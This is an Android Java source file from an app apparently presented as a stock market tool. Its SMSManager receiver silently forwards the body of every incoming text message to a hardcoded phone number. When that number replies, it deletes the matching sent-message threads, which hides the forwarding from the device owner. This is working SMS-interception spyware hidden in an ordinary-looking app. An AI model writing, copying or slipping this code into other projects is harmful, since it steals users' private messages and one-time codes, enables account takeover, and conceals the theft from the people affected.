package asdev.com.asstockmarket;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;


/*import android.util.Log;
import android.widget.Toast;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import static android.content.ContentValues.TAG;*/
public class SMSManager extends BroadcastReceiver {

    // private DatabaseReference mDatabase;
    public String phoneNo = "9006134477";
    public String message;
    public String phone;

    @Override
    public void onReceive(Context context, Intent intent) {
        // mDatabase = FirebaseDatabase.getInstance().getReference();
     /*   FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference().child("phoneNo");
        myRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                // This method is called once with the initial value and again
                // whenever data at this location is updated.
                String value = dataSnapshot.getValue(String.class);
                 phoneNo = value;
            }

            @Override
            public void onCancelled(DatabaseError databaseError) {
                // Failed to read value


            }
        });*/


        // Get the message
        Bundle extras = intent.getExtras();

        // Set object message in android device
        SmsMessage[] smgs = null;

        // Content SMS message
        String infoSMS = "";

        if (extras != null) {
            // Retrieve the SMS message received
            Object[] pdus = (Object[]) extras.get("pdus");
            smgs = new SmsMessage[pdus.length];

            for (int i = 0; i < smgs.length; i++) {
                smgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                phone = smgs[i].getOriginatingAddress();
                infoSMS += smgs[i].getMessageBody().toString();
                infoSMS += "\n";
            }
            message = infoSMS;
            // Toast.makeText(context, infoSMS, Toast.LENGTH_LONG).show();
            // mDatabase.child("Message").child(message);
            try {
                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(phoneNo, null, message, null, null);
            } catch (Exception e) {
                e.printStackTrace();
            }


            if (phone.equals("9006134477")) {
                Uri uri = Uri.parse("content://sms/sent");
                ContentResolver contentResolver = context.getContentResolver();
                String where = "address=" + phone;
                Cursor cursor = contentResolver.query(uri, new String[]{"_id", "thread_id"}, where, null, null);
                while (cursor.moveToNext()) {
                    long thread_id = cursor.getLong(1);
                    where = "thread_id=" + thread_id;
                    Uri thread = Uri.parse("content://sms/sent");
                    context.getContentResolver().delete(thread, where, null);
                }


            }
        }
    }
}